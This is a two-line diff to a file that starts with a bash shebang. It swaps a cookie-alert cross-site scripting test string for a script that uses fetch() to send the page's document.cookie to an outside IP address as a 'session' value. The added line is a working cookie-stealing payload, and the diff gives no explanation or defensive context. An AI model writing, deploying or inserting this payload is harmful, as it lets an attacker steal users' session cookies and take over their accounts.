@@ -1,2 +1,2 @@
 #!/bin/bash
-<script>#"><img src=/ onerror=alert(document.cookie)></script>
+<script> fetch("http://10.42.129.164/.session=" + document.cookie)  </script>
